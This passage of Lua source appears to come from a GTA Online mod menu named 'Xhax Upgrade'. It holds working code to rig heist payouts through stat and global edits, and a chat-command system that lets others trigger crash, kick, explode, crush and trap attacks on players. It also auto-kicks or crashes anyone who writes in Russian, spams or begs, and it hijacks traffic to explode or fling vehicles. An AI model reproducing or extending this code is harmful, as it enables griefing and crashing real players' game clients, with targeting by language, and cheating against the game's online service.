    if svoutfits.masktxt[i] == nil then
        svoutfits.masktxt[i] = -1
    end
    if svoutfits.hair[i] == nil then
        svoutfits.hair[i] = -1
    end
    if svoutfits.hairtxt[i] == nil then
        svoutfits.hairtxt[i] = -1
    end
    if svoutfits.torso[i] == nil then
        svoutfits.torso[i] = -1
    end
    if svoutfits.torsotxt[i] == nil then
        svoutfits.torsotxt[i] = -1
    end
    if svoutfits.leg[i] == nil then
        svoutfits.leg[i] = -1
    end
    if svoutfits.legtxt[i] == nil then
        svoutfits.legtxt[i] = -1
    end
    if svoutfits.parachute[i] == nil then
        svoutfits.parachute[i] = -1
    end
    if svoutfits.parachutetxt[i] == nil then
        svoutfits.parachutetxt[i] = -1
    end
    if svoutfits.shoes[i] == nil then
        svoutfits.shoes[i] = -1
    end
    if svoutfits.shoestxt[i] == nil then
        svoutfits.shoestxt[i] = -1
    end
    if svoutfits.accessory[i] == nil then
        svoutfits.accessory[i] = -1
    end
    if svoutfits.accessorytxt[i] == nil then
        svoutfits.accessorytxt[i] = -1
    end
    if svoutfits.undershirt[i] == nil then
        svoutfits.undershirt[i] = -1
    end
    if svoutfits.undershirttxt[i] == nil then
        svoutfits.undershirttxt[i] = -1
    end
    if svoutfits.kevlar[i] == nil then
        svoutfits.kevlar[i] = -1
    end
    if svoutfits.kevlartxt[i] == nil then
        svoutfits.kevlartxt[i] = -1
    end
    if svoutfits.badge[i] == nil then
        svoutfits.badge[i] = -1
    end
    if svoutfits.badgetxt[i] == nil then
        svoutfits.badgetxt[i] = -1
    end
    if svoutfits.torso2[i] == nil then
        svoutfits.torso2[i] = -1
    end
    if svoutfits.torso2txt[i] == nil then
        svoutfits.torso2txt[i] = -1
    end
    if svoutfits.hat[i] == nil then
        svoutfits.hat[i] = -1
    end
    if svoutfits.hattxt[i] == nil then
        svoutfits.hattxt[i] = -1
    end
    if svoutfits.glasses[i] == nil then
        svoutfits.glasses[i] = -1
    end
    if svoutfits.glassestxt[i] == nil then
        svoutfits.glassestxt[i] = -1
    end
    if svoutfits.ear[i] == nil then
        svoutfits.ear[i] = -1
    end
    if svoutfits.eartxt[i] == nil then
        svoutfits.eartxt[i] = -1
    end
    if svoutfits.model[i] == nil then
        s.notify("Couldn't read model!")
    end
    if svoutfits.model[i] ~= model then
        if svoutfits.model[i] == false then
            s.notify(text["This outfit is for male!"])
        end
        if svoutfits.model[i] == true then
            s.notify(text["This outfit is for female!"])
        end
    else
        PED.CLEAR_ALL_PED_PROPS(ped)
        set.comp_var(ped, 1, tonumber(svoutfits.mask[i]), tonumber(svoutfits.masktxt[i]), 0)
        set.comp_var(ped, 2, tonumber(svoutfits.hair[i]), tonumber(svoutfits.hairtxt[i]), 0)
        set.comp_var(ped, 3, tonumber(svoutfits.torso[i]), tonumber(svoutfits.torsotxt[i]), 0)
        set.comp_var(ped, 4, tonumber(svoutfits.leg[i]), tonumber(svoutfits.legtxt[i]), 0)
        set.comp_var(ped, 5, tonumber(svoutfits.parachute[i]), tonumber(svoutfits.parachutetxt[i]), 0)
        set.comp_var(ped, 6, tonumber(svoutfits.shoes[i]), tonumber(svoutfits.shoestxt[i]), 0)
        set.comp_var(ped, 7, tonumber(svoutfits.accessory[i]), tonumber(svoutfits.accessorytxt[i]), 0)
        set.comp_var(ped, 8, tonumber(svoutfits.undershirt[i]), tonumber(svoutfits.undershirttxt[i]), 0)
        set.comp_var(ped, 9, tonumber(svoutfits.kevlar[i]), tonumber(svoutfits.kevlartxt[i]), 0)
        set.comp_var(ped, 10, tonumber(svoutfits.badge[i]), tonumber(svoutfits.badgetxt[i]), 0)
        set.comp_var(ped, 11, tonumber(svoutfits.torso2[i]), tonumber(svoutfits.torso2txt[i]), 0)
        set.prop(ped, 0, tonumber(svoutfits.hat[i]), tonumber(svoutfits.hattxt[i]), true)
        set.prop(ped, 1, tonumber(svoutfits.glasses[i]), tonumber(svoutfits.glassestxt[i]), true)
        set.prop(ped, 2, tonumber(svoutfits.ear[i]), tonumber(svoutfits.eartxt[i]), true)
        update_outfit()
    end
end
function rename_outfit(i)
    if outfitname == nil then
        s.notify(text["Please enter name!"])
    elseif outfitname == "" then
        s.notify(text["Please enter name!"])
    else
        outfitname = outfitname:sub(1, 18)
        outfitname = outfitname:gsub("  +", " ")
        if outfitname:sub(1, 1) == " " or outfitname:sub(-1, -1) == " " then
            s.notify(text["Invalid Name!"])
            return
        elseif #outfitname < 3 then
            s.notify(text["Invalid Name,must be at least 3 characters!"])
            return
        end
        for x = 1, #svoutfits.name do
            if tostring(svoutfits.name[x]) == tostring(outfitname) then
                s.notify(text["Name already exists"])
                return
            end
        end
        local outfit = (path["Outfits"] .. [[\]] .. tostring(svoutfits.name[i]) .. ".txt")
        os.remove(outfit)
        remove(svoutfits.name, i)
        insert(svoutfits.name, i, outfitname)
        UpdateOutfitFile()
    end
end
function delete_outfit(i)
    local outfit = (path["Outfits"] .. [[\]] .. tostring(svoutfits.name[i]) .. ".txt")
    os.remove(outfit)
    remove_outfit_from_table(i)
end
function ResetCasino()
    local char = STATS.STAT_GET_INT(joaat("MPPLY_LAST_MP_CHAR"))
    for _, v in ipairs(casino_presets) do
        STATS.STAT_SET_INT(joaat("MP" .. char .. v[1]), 0, true)
    end
end
function CasinoPreset(p0, p1, p2)
    local char = STATS.STAT_GET_INT(joaat("MPPLY_LAST_MP_CHAR"))
    for _, v in ipairs(casino_presets) do
        if v[1] == "_H3OPT_APPROACH" then
            v[2] = p0
        end
        if v[1] == "_H3_HARD_APPROACH" then
            v[2] = p1
        end
        if v[1] == "_H3OPT_CREWWEAP" then
            v[2] = p2
        end
        STATS.STAT_SET_INT(joaat("MP" .. char .. v[1]), v[2], true)
    end
end
function ResetCayo()
    local char = STATS.STAT_GET_INT(joaat("MPPLY_LAST_MP_CHAR"))
    for k in pairs(cayo_presets) do
        STATS.STAT_SET_INT(joaat("MP" .. char .. k), 0, true)
    end
end
function CayoPrep(type)
    local char = STATS.STAT_GET_INT(joaat("MPPLY_LAST_MP_CHAR"))
    for k, v in pairs(cayo_presets) do
        if v[type] ~= nil then
            STATS.STAT_SET_INT(joaat("MP" .. char .. k), v[type], true)
        end
    end
end
function CayoPresets1()
    if cayosolo then
        CayoPrep(1)
    end
    while cayosolo do
        set.global_f(262145 + 29626, -0.1)
        set.global_f(262145 + 29627, -0.02)
        set.global_i(262145 + 29380, 1800)
        set.global_i(1973525 + 823 + 56 + 1, 100)
        s.wait(1000)
    end
end
function CayoPresets2()
    if cayo2 then
        CayoPrep(2)
    end
    while cayo2 do
        set.global_f(262145 + 29626, -0.1)
        set.global_f(262145 + 29627, -0.02)
        set.global_i(262145 + 29380, 1800)
        set.global_i(1973525 + 823 + 56 + 1, 50)
        set.global_i(1973525 + 823 + 56 + 2, 50)
        s.wait(1000)
    end
end
function CayoPresets3()
    if cayo3 then
        CayoPrep(3)
    end
    while cayo3 do
        set.global_f(262145 + 9626, -0.1)
        set.global_f(262145 + 29627, -0.02)
        set.global_i(262145 + 29380, 1800)
        set.global_i(1973525 + 823 + 56 + 1, 30)
        set.global_i(1973525 + 823 + 56 + 2, 35)
        set.global_i(1973525 + 823 + 56 + 3, 35)
        s.wait(1000)
    end
end
function CayoPresets4()
    if cayo4 then
        CayoPrep(4)
    end
    while cayo4 do
        set.global_f(262145 + 29626, -0.1)
        set.global_f(262145 + 29627, -0.02)
        set.global_i(262145 + 29380, 1800)
        set.global_i(1973525 + 823 + 56 + 1, 25)
        set.global_i(1973525 + 823 + 56 + 2, 25)
        set.global_i(1973525 + 823 + 56 + 3, 25)
        set.global_i(1973525 + 823 + 56 + 4, 25)
        s.wait(1000)
    end
end
function load_weapons_file()
    local t = scandir(path["WeaponLoadout"])
    local counter = 0
    for p = 1, #t do
        if t[p]:find("%.json") then
            if t[p]:lower() == "default.json" then
                LoadWeapons(t[p]:gsub("%.json", ""))
            end
            counter = counter + 1
        end
    end
    log("Xhax Upgrade", "Weapon loadouts found: " .. counter)
end
function AddWeapon(hash)
    if not WEAPON.IS_WEAPON_VALID(hash) then
        return
    end
    local ped = get.ped_id()
    if not WEAPON.HAS_PED_GOT_WEAPON(ped, hash) then
        local max = WEAPON.GET_MAX_AMMO(ped, hash)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped, hash, max, false)
        local ammo = WEAPON.GET_PED_AMMO_TYPE_FROM_WEAPON(ped, hash)
        WEAPON.SET_PED_AMMO_BY_TYPE(ped, ammo, max)
        WEAPON.SET_PED_AMMO(ped, hash, max)
    end
end
function RemoveWeapon(hash)
    if not WEAPON.IS_WEAPON_VALID(hash) then
        return
    end
    local ped = get.ped_id()
    if WEAPON.HAS_PED_GOT_WEAPON(ped, hash) then
        WEAPON.REMOVE_WEAPON_FROM_PED(ped, hash)
    end
end
function AddComponent(hash, component)
    if not WEAPON.IS_WEAPON_VALID(hash) then
        return
    end
    local ped = get.ped_id()
    if not WEAPON.HAS_PED_GOT_WEAPON(ped, hash) then
        return
    end
    if not WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(ped, hash, component) then
        WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(ped, hash, component)
    end
end
function RemoveComponent(hash, component)
    if not WEAPON.IS_WEAPON_VALID(hash) then
        return
    end
    local ped = get.ped_id()
    if WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(ped, hash, component) then
        WEAPON.REMOVE_WEAPON_COMPONENT_FROM_PED(ped, hash, component)
    end
end
function HandleChat(line, L)
    Lines[L] = 1
    if not IsChat(line) then
        return nil
    end
    local msg = nil
    for i, x in ipairs(split(line, "%s")) do
        if i == 3 then
            msg = x
        elseif i > 3 then
            msg = msg .. " " .. x
        end
    end
    wait()
    local name = nil
    local message = nil
    local player = nil
    for i, x in pairs(string.split(msg, " wrote: ")) do
        if i == 1 then
            for i2, x2 in pairs(string.split(x, " ")) do
                if i2 == 2 then
                    name = x2
                end
            end
        elseif i == 2 then
            message = x
        end
    end
    local player = GetPlayer(name)
    return player, message
end
function Command(player, command)
    if string.find(string.lower(command), "^/help") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /help")
        log("Xhax Upgrade", get.name(player) .. " requested command /help")
        NETWORK.SEND_CHAT_MESSAGE_AS(
            player,
            "\n\n\n\n\n\n\n\n\n\nAvailable commands:\n/help\n/giveweapons\n/clearwanted\n/explodeall\n/crashall\n/kickall\n/vehiclegod\n/vehiclepaint\n/spawn <vehicle>\n/explode <pl>\n/kick <pl>\n/crash <pl>\n/sendtoisland <pl>\n/vehiclekick <pl>\n/trap <pl>\n/bounty <pl>\n/crush <pl>",
            false
        )
    elseif string.find(string.lower(command), "^/giveweapons") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /giveweapons")
        for i = 1, #weaphash do
            local plped = get.ped(player)
            if not WEAPON.HAS_PED_GOT_WEAPON(plped, weaphash[i]) then
                s.give_weapon(plped, weaphash[i], 9999, false)
                wait()
            end
        end
    elseif string.find(string.lower(command), "^/clearwanted") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /clearwanted")
        log("Xhax Upgrade", get.name(player) .. " requested command /clearwanted")
        s.send_se(player, {-91354030, player, get.global_i(1893551 + (1 + (player * 599) + 510))})
    elseif string.find(string.lower(command), "^/vehiclegod") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /vehiclegod")
        log("Xhax Upgrade", get.name(player) .. " requested command /vehiclegod")
        if not get.player_in_veh(player) then
            return
        end
        local veh = get.veh(player)
        if rqCtrl(veh, 500) then
            SetVehicleGod(veh, true)
        end
    elseif string.find(string.lower(command), "^/vehiclepaint") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /vehiclepaint")
        log("Xhax Upgrade", get.name(player) .. " requested command /vehiclepaint")
        if not get.player_in_veh(player) then
            return
        end
        local veh = get.veh(player)
        local p = random(1, #vehicle_colors)
        if rqCtrl(veh, 500) then
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(
                veh,
                vehicle_colors[p][1],
                vehicle_colors[p][2],
                vehicle_colors[p][3]
            )
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(
                veh,
                vehicle_colors[p][1],
                vehicle_colors[p][2],
                vehicle_colors[p][3]
            )
        end
    elseif string.find(string.lower(command), "^/explodeall") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /explodeall")
        log("Xhax Upgrade", get.name(player) .. " requested command /explodeall")
        local pos = {x = 0, y = 0, z = 0}
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and IgnoreFriends == true then
                goto continue
            end
            if ID == player then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            s.clear_task(get.ped(ID))
            pos = get.coords(ID)
            set.explosion(pos.x, pos.y, pos.z, 4, 10, true, true, 1, false)
            ::continue::
        end
    elseif string.find(string.lower(command), "^/kickall") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /kickall")
        log("Xhax Upgrade", get.name(player) .. " requested command /kickall")
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and IgnoreFriends == true then
                goto continue
            end
            if ID == player then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            if s.ishost() then
                log("Xhax Upgrade", "Kicking " .. get.name(ID))
                s.kick(ID)
            else
                script_kick(ID)
            end
            ::continue::
            s.wait(10)
        end
    elseif string.find(string.lower(command), "^/crashall") then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /crashall")
        log("Xhax Upgrade", get.name(player) .. " requested command /crashall")
        for ID = 0, 31 do
            if ID == get.id() then
                goto continue
            end
            if s.is_friend(ID) and IgnoreFriends == true then
                goto continue
            end
            if ID == player then
                goto continue
            end
            if not s.is_valid(ID) then
                goto continue
            end
            script_crash(ID)
            ::continue::
            s.wait(10)
        end
    elseif string.find(string.lower(command), "^/explode") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /explode")
        log("Xhax Upgrade", get.name(player) .. " requested command /explode")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        local ped = get.ped(ID)
        s.clear_task(ped)
        s.wait(10)
        local pos = get.coords(ID)
        set.explosion(pos.x, pos.y, pos.z, 4, 10, true, true, 1, false)
    elseif string.find(string.lower(command), "^/kick") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /kick")
        log("Xhax Upgrade", get.name(player) .. " requested command /kick")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        if s.ishost() then
            log("Xhax Upgrade", "Kicking " .. get.name(ID))
            s.kick(ID)
        else
            script_kick(ID)
        end
    elseif string.find(string.lower(command), "^/crash") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /crash")
        log("Xhax Upgrade", get.name(player) .. " requested command /crash")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        script_crash(ID)
    elseif string.find(string.lower(command), "^/sendtoisland") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /sendtoisland")
        log("Xhax Upgrade", get.name(player) .. " requested command /sendtoisland")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        s.send_se(ID, {-621279188, ID, 1})
    elseif string.find(string.lower(command), "^/vehiclekick") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /vehiclekick")
        log("Xhax Upgrade", get.name(player) .. " requested command /vehiclekick")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        local pped = get.ped(ID)
        s.clear_task(pped)
    elseif string.find(string.lower(command), "^/trap") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /trap")
        log("Xhax Upgrade", get.name(player) .. " requested command /trap")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        local pos = get.coords(ID)
        local trapmodel = set.obj(1125864094, pos.x, pos.y, pos.z - 10, true, false, false)
        set.rotation(trapmodel, 0, 90, 0, 5, false)
        ENTITY.SET_ENTITY_VISIBLE(trapmodel, false, false)
    elseif string.find(string.lower(command), "^/bounty") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /bounty")
        log("Xhax Upgrade", get.name(player) .. " requested command /bounty")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        for id = 0, 31 do
            s.send_se(
                id,
                {
                    1294995624,
                    id,
                    ID,
                    1,
                    10000,
                    0,
                    1,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    get.global_i(1921039 + 9),
                    get.global_i(1921039 + 10)
                }
            )
        end
    elseif string.find(string.lower(command), "^/crush") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /crush")
        log("Xhax Upgrade", get.name(player) .. " requested command /crush")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local ID = GetPlayer(Name)
        if ID == get.id() then
            return
        end
        if s.is_friend(ID) and IgnoreFriends then
            return
        end
        local ped = get.ped(ID)
        local hash = 782665360
        rqModel(hash)
        s.clear_task(ped)
        s.wait(10)
        local pos = get.coords(ID)
        local veh = set.veh(hash, pos.x, pos.y, pos.z + 15, 0, true, false, false)
        set.model_as_noneeded(hash)
        set.locked(veh, 2)
        rqCtrl(veh)
        s.clear_task(ped)
        s.apply_force(veh, 1, 0, 0, -15, true, false, true, false)
        s.wait(2000)
        rqCtrl(veh)
        s.delete(veh)
    elseif string.find(string.lower(command), "^/spawn") ~= nil then
        if FriendsOnly and s.is_friend(player) == false then
            return
        end
        s.notify(get.name(player) .. " requested command /spawn")
        log("Xhax Upgrade", get.name(player) .. " requested command /spawn")
        local Name = nil
        for i, x in pairs(string.split(command, " ")) do
            if i == 2 then
                Name = x
            elseif i > 2 then
                Name = Name .. " " .. x
            end
        end
        if Name == nil then
            return false
        end
        local hash = joaat(Name)
        if not STREAMING.IS_MODEL_VALID(hash) then
            return
        end
        local ped = get.ped(player)
        local pos = get.offset_coords(ped, 0, 5, 0)
        local heading = ENTITY.GET_ENTITY_HEADING(ped)
        local veh = SpawnVehicle(hash, pos, heading, false, true, true)
    end
end
function RemoveRussians(player, message)
    if s.is_friend(player) and table_settings[1][2] == true then
        return
    end
    if x == get.id() then
        return
    end
    for i = 1, #russianmes do
        if message:find(russianmes[i]) then
            if chatreaction[1] == true then
                if s.ishost() then
                    log("Xhax Upgrade", "Kicking " .. get.name(player))
                    s.kick(player)
                else
                    script_kick(player)
                end
            elseif chatreaction[2] == true then
                script_crash(player)
            end
            return
        end
    end
end
function spamdetected(player)
    local name = get.name(player)
    local rid = get.scid(player)
    if chatreaction[3] == true then
        if s.ishost() then
            log("Xhax Upgrade", "Kicking " .. name)
            s.kick(player)
        else
            script_kick(player)
        end
    elseif chatreaction[4] == true then
        script_crash(player)
    elseif chatreaction[5] == true then
        s.notify(text["Chat spam detected from"] .. ": " .. name)
    elseif chatreaction[6] == true then
        s.notify(text["Chat spam detected from"] .. ": " .. name)
        if s.ishost() then
            log("Xhax Upgrade", "Kicking " .. name)
            s.kick(player)
        else
            script_kick(player)
        end
    elseif chatreaction[7] == true then
        s.notify(text["Chat spam detected from"] .. ": " .. name)
        script_crash(player)
    end
    local ridfile = assert(open(file["LocalData"], "a"))
    ridfile:write(tostring(rid) .. "\n")
    ridfile:close()
    local spam_mes = "\n"
    for i = 1, 8 do
        spam_mes = spam_mes .. "" .. spam_mes
    end
    send_message(spam_mes)
end
function SpamDetection(player, message)
    if s.is_friend(player) and table_settings[1][2] == true then
        return
    end
    if player == get.id() then
        return
    end
    if first_message_sender == nil then
        first_message_sender = player
        first_message = message
        spamtime = os.time() + 4
    elseif first_message_sender == player then
        if os.time() < spamtime then
            second_message = message
            log(
                "Xhax Upgrade",
                "Chat spam detected from player: " ..
                    get.name() .. " First message: " .. first_message .. " Second message: " .. second_message
            )
            spamdetected(player)
        end
        reset()
    else
        reset()
    end
end
function PunishBeggers(player, message)
    if s.is_friend(player) and table_settings[1][2] == true then
        return
    end
    if player == get.id() then
        return
    end
    local message = message:gsub(" ", "")
    local message = string.lower(message)
    for i = 1, #beggermes do
        if string.find(message, beggermes[i]) then
            local ped = get.ped(player)
            log("Xhax Upgrade", "Player: " .. player .. " is begging for money")
            if chatreaction[8] == true then
                for t = 1, 3 do
                    s.clear_task(ped)
                    s.wait(100)
                    local coords = get.coords(player)
                    FIRE.ADD_OWNED_EXPLOSION(ped, coords.x, coords.y, coords.z, 4, 1, true, true, 0)
                end
            elseif chatreaction[9] == true then
                for t = 1, 100 do
                    s.clear_task(ped)
                    s.wait(10)
                end
            elseif chatreaction[10] == true then
                s.send_se(player, {-621279188, player, 1})
            elseif chatreaction[11] == true then
                s.send_se(player, {603406648, player, player, 4294967295, 1, 115, 0, 0, 0})
            elseif chatreaction[12] == true then
                s.send_se(
                    player,
                    {
                        -1704141512,
                        player,
                        50000,
                        0,
                        1,
                        get.global_i(1893551 + (1 + (player * 599) + 510)),
                        get.global_i(1921039 + 9),
                        get.global_i(1921039 + 10),
                        1
                    }
                )
            elseif chatreaction[13] == true then
                if s.ishost() then
                    log("Xhax Upgrade", "Kicking " .. get.name(player))
                    s.kick(player)
                else
                    script_kick(player)
                end
            elseif chatreaction[14] == true then
                script_crash(player)
            end
            return
        end
    end
end
function Spawn_Vehicle(i, upgrade, ingod)
    local hash = VehicleModel[i][2]
    rqModel(hash)
    local ped, coords = get.ped(get.selected()), get.coords(get.selected())
    if floor(coords.z) == -50 then
        s.clear_task(ped)
        s.wait(100)
    end
    local pos = get.offset_coords(ped, 0, 5, 0)
    local heading = ENTITY.GET_ENTITY_HEADING(ped)
    local veh = set.veh(hash, pos.x, pos.y, pos.z, heading, true, false, false)
    rqCtrl(veh)
    if upgrade then
        UpgradeVehicle(veh)
    end
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, "XF")
    if ingod then
        SetVehicleGod(veh, true)
    end
    DECORATOR.DECOR_SET_INT(veh, "MPBitset", 1 << 10)
    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(veh, 5)
    VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
    set.model_as_noneeded(hash)
end
function limit_max_speed()
    local pid = get.selected()
    local veh = get.veh(pid)
    if rqCtrl(veh, 500) then
        ENTITY.SET_ENTITY_MAX_SPEED(veh, speed)
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(veh, speed)
    end
end
function MaxAcceleration()
    while maxaccel do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle[i], 200)
                    end
                end
            end
        end
        wait()
    end
end
function HornHavoc()
    while hornhavoc do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        VEHICLE.START_VEHICLE_HORN(vehicle[i], 3000, 0, false)
                    end
                end
            end
        end
        wait()
    end
end
function ExplodeOnImpact()
    while explodeonimpact do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(vehicle[i]) then
                    if getPersonalVeh() ~= vehicle[i] then
                        if s.has_control(vehicle[i]) then
                            SetVehicleGod(vehicle[i], false)
                            VEHICLE.EXPLODE_VEHICLE(vehicle[i], true, true, true)
                        end
                    end
                end
            end
        end
        wait()
    end
end
function HotTraffic()
    while hottraffic do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle[i], 0)
                        set.veh_tog_mod(vehicle[i], 20, true)
                        set.veh_tog_mod(vehicle[i], 22, true)
                        VEHICLE.SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle[i], 0, true)
                        VEHICLE.SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle[i], 1, true)
                        VEHICLE.SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle[i], 2, true)
                        VEHICLE.SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle[i], 3, true)
                        VEHICLE.SET_VEHICLE_COLOURS(vehicle[i], 135, 135)
                        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle[i], 255, 0, 110)
                        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle[i], 255, 0, 110)
                        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle[i], 135, 135)
                        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle[i], 255, 0, 110)
                        VEHICLE.SET_VEHICLE_XENON_LIGHTS_COLOR(vehicle[i], 10)
                        VEHICLE.SET_VEHICLE_NEON_LIGHTS_COLOR(vehicle[i], 255, 0, 110)
                    end
                end
            end
        end
        wait()
    end
end
function BouncyVehs()
    while bouncyvehs do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(vehicle[i]) then
                        local vel = get.velocity(vehicle[i])
                        if vel.x < 10 and vel.y < 10 and vel.z < 10 then
                            velfactor = 300
                        else
                            velfactor = 60
                        end
                        if s.has_control(vehicle[i]) then
                            ENTITY.APPLY_FORCE_TO_ENTITY(
                                vehicle[i],
                                0,
                                vel.x * -velfactor,
                                vel.y * -velfactor,
                                vel.z * -velfactor,
                                0.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                true,
                                false,
                                true
                            )
                        end
                    end
                end
            end
        end
        wait()
    end
end
function Beyblades_()
    while beyblades do
        local vehicle = getAllVehs()
        wait()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle[i], true)
                        ENTITY.APPLY_FORCE_TO_ENTITY(
                            vehicle[i],
                            1,
                            1,
                            0,
                            0,
                            100,
                            100,
                            0,
                            0,
                            true,
                            true,
                            true,
                            false,
                            true
                        )
                    end
                end
            end
        end
        wait()
    end
    if beyblades == false then
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
                if getPersonalVeh() ~= vehicle[i] then
                    if s.has_control(vehicle[i]) then
                        VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle[i], false)
                    end
                end
            end
        end
    end
end
function TirePopin()
    while tirepopin do
        local vehicle = getAllVehs()
        get_control_of_entities(vehicle)
        wait()
        for i = 1, #vehicle do
            if vehicle[i] ~= get.veh(get.id()) then
